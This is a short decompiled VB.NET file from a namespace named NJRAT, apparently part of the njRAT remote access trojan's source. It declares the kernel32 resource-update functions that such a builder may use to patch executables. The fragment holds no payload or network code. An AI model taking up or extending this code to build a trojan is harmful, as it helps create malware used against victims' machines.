Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Security

Namespace NJRAT
	' Token: 0x0200002F RID: 47
	<SuppressUnmanagedCodeSecurity()>
	Public NotInheritable Class GClass2
		' Token: 0x0600058F RID: 1423 RVA: 0x00142814 File Offset: 0x00140C14
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x06000590 RID: 1424
		Public Declare Function BeginUpdateResource Lib "kernel32" (string_0 As String, <MarshalAs(UnmanagedType.Bool)> bool_0 As Boolean) As IntPtr

		' Token: 0x06000591 RID: 1425
		Public Declare Function EndUpdateResource Lib "kernel32" (intptr_0 As IntPtr, <MarshalAs(UnmanagedType.Bool)> bool_0 As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x06000592 RID: 1426
		Public Declare Function UpdateResource Lib "kernel32" (intptr_0 As IntPtr, intptr_1 As IntPtr, intptr_2 As IntPtr, short_0 As Short, <MarshalAs(UnmanagedType.LPArray, SizeConst := 0, SizeParamIndex := 5S)> byte_0 As Byte(), int_0 As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
	End Class
End Namespace
